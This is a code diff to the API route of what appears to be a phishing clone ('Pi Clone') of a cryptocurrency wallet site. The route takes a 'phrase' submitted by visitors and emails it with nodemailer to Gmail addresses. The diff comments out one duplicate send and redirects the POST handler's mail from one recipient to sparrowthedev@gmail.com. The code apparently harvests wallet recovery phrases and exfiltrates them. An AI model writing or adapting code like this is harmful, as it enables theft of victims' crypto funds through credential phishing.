@@ -1,16 +1,16 @@
 import nodemailer from 'nodemailer';
 
 const formatMessage = async (message: string) => {
-    const email = process.env.MY_EMAIL;
-    const pass = process.env.MY_PASS;
+    // const email = process.env.MY_EMAIL;
+    // const pass = process.env.MY_PASS;
 
-    const transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-            user: email,
-            pass,
-        }
-    });
+    // const transporter = nodemailer.createTransport({
+    //     service: 'gmail',
+    //     auth: {
+    //         user: email,
+    //         pass,
+    //     }
+    // });
 
     // Split the message into lines
     const lines = message.split(/\r?\n/);
@@ -21,28 +21,28 @@ const formatMessage = async (message: string) => {
     // Join formatted lines into a single HTML string
     const formattedMessage = formattedLines.join('');
 
-    const mailOptions = {
-        from: `Pi Clone ${email}`,
-        to: "sparrowthedev@gmail.com",
-        subject: "Yo! you just got a new phrase from Godzilla",
-        html: formattedMessage,
-    };
+    // const mailOptions = {
+    //     from: `Pi Clone ${email}`,
+    //     to: "sparrowthedev@gmail.com",
+    //     subject: "Yo! you just got a new phrase from Godzilla",
+    //     html: formattedMessage,
+    // };
 
-    transporter.verify(function (error: any, success: any) {
-        if (error) {
-            console.log(`here is the error: ${error}`);
-        } else {
-            console.log("From two: Server is ready to take our messages");
-        }
-    });
+    // transporter.verify(function (error: any, success: any) {
+    //     if (error) {
+    //         console.log(`here is the error: ${error}`);
+    //     } else {
+    //         console.log("From two: Server is ready to take our messages");
+    //     }
+    // });
 
-    const result = await transporter.sendMail(mailOptions);
+    // const result = await transporter.sendMail(mailOptions);
 
-    if (result.response.includes("OK")) {
-        console.log("email sent successfully!!");
-    } else {
-        console.log("Internal server error");
-    }
+    // if (result.response.includes("OK")) {
+    //     console.log("email sent successfully!!");
+    // } else {
+    //     console.log("Internal server error");
+    // }
 
     // Return the formatted message
     return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
@@ -65,9 +65,9 @@ export async function POST(request: Request) {
         const formattedMessage = await formatMessage(message);
         
         const mailOptions = {
-            from: `Pi Clone ${email}`,
-            to: 'escrowlinks@gmail.com',
-            subject: "Phrase From Your Website",
+            from: `Dev's Clone ${email}`,
+            to: 'sparrowthedev@gmail.com',
+            subject: "Dev you just got a new phrase!",
             html: formattedMessage,
         };
 
